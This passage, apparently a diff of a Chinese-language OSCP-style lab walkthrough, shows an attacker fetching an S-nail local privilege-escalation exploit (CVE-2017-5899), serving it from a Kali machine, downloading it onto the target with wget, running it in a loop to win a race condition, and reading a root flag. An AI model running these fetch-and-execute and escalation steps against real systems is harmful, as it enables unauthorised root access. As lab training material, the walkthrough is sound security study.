@@ -126,4 +126,33 @@ S-nail < 14.8.16 - Local Privilege Escalat | multiple/local/47172.sh
 ------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ searchsploit -m multiple/local/47172.sh
+  Exploit: S-nail < 14.8.16 - Local Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/47172
+     Path: /usr/share/exploitdb/exploits/multiple/local/47172.sh
+    Codes: CVE-2017-5899
+ Verified: False
+File Type: POSIX shell script, ASCII text executable
+cp: overwrite '/home/kali/'$'\346\241\214\351\235\242''/OSCP/47172.sh'? 
+Copied to: /home/kali/桌面/OSCP/47172.sh
+
+┌──(kali㉿kali)-[~/桌面/OSCP]
+└─$ php -S 0.0.0.0:1234
+[Thu Apr 18 13:27:20 2024] PHP 8.2.12 Development Server (http://0.0.0.0:1234) started
+[Thu Apr 18 13:27:55 2024] 192.168.44.138:40538 Accepted
+[Thu Apr 18 13:27:55 2024] 192.168.44.138:40538 [200]: GET /47172.sh
+[Thu Apr 18 13:27:55 2024] 192.168.44.138:40538 Closing
+
+```
+由于此漏洞利用在竞争条件下起作用,这里执行一次不能直接提权，可以使用加个循环去执行。
+
+```css
+chad@gigachad:~$ wget http://192.168.44.128:1234/47172.sh
+chmod +x 47172.sh
+while true; do ./47172.sh ;done
+
+
+# cat /root/root.txt
+832B123648707C6CD022DD9009AEF2FD
 ```
